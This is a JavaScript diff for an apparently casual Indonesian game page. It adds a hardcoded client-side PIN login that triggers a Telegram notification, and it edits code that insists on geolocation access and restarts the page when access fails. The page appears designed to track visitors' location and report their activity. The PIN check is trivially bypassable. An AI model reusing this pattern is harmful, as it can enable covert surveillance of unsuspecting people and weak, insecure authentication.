@@ -17,11 +17,28 @@ function createSparkles() {
     }, 500);
 }
 
+// Login functionality
+async function checkPin() {
+    const pin = document.getElementById('pinInput').value;
+    if (pin === '261103') {
+        // Send Telegram notification
+        await sendTelegramNotification();
+
+        // Show success and enter games
+        showNotification('Login berhasil! Selamat datang! 🌸', '#4CAF50');
+        setTimeout(() => {
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('gameContainer').style.display = 'block';
+            createEmojiRain();
+        }, 1000);
+    } else {
+        showNotification('PIN salah! Coba lagi 😅', '#f44336');
+        document.getElementById('pinInput').value = '';
+    }
+}
+
 // Fungsi utama untuk meminta akses lokasi dan mengelola tampilan
 function initializeLocationAccess() {
-    // Pastikan game container tersembunyi saat start
-    document.getElementById('gameContainer').style.display = 'none';
-    
     if (!navigator.geolocation) {
         alert('Browser Anda tidak mendukung geolocation. Silakan gunakan browser yang lebih modern.');
         return;
@@ -53,9 +70,9 @@ function initializeLocationAccess() {
             
             let errorMessage = '';
             switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMessage = 'Akses lokasi ditolak. Website akan restart untuk meminta akses kembali.';
-                    break;
+                // case error.PERMISSION_DENIED:
+                //     errorMessage = 'Akses lokasi ditolak. Website akan restart untuk meminta akses kembali.';
+                //     break;
                 case error.POSITION_UNAVAILABLE:
                     errorMessage = 'Informasi lokasi tidak tersedia. Website akan restart.';
                     break;
